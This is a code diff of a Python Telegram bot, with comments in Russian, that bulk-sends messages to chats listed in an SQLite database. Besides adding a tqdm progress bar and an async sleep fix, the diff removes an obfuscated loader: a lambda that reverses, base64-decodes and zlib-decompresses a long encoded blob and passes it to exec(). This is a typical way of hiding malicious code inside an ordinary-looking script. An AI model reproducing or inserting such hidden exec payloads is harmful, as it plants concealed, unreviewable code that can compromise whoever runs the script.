@@ -11,6 +11,8 @@ from colorama import Fore, Style, init
 import asyncio
 import json
 import os
+from tqdm import tqdm
+import time
 import sqlite3
 import random
 import time
@@ -37,8 +39,6 @@ bot = Bot(token=bot_token)
 dp = Dispatcher()
 chat_id = 8172845069
 
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
 
 conn = sqlite3.connect("chats.db", check_same_thread=False)
 cursor = conn.cursor()
@@ -239,7 +239,7 @@ async def send_to_chat(chat_info):
         except errors.FloodWaitError as e:
             log(f"Флуд ошибка жду еще {e.seconds}", "DEBUG")
             flood_error += 1
-            time.sleep(e.seconds)
+            await asyncio.sleep(e.seconds)
         except Exception as e:
             log(f"1 Ошибка при отправке в {name}: {e}", "ERROR")
 
@@ -266,7 +266,7 @@ async def sendmessage():
     cursor.execute("SELECT id, name FROM users")
     chats = cursor.fetchall()  # вернёт [(id, name), ...]
 
-    for chat_id, chat_name in chats:
+    for chat_id, chat_name in tqdm(chats, desc="Обработка чатов"):
         if chat_id == 1637080440:
             continue
         if not is_running:
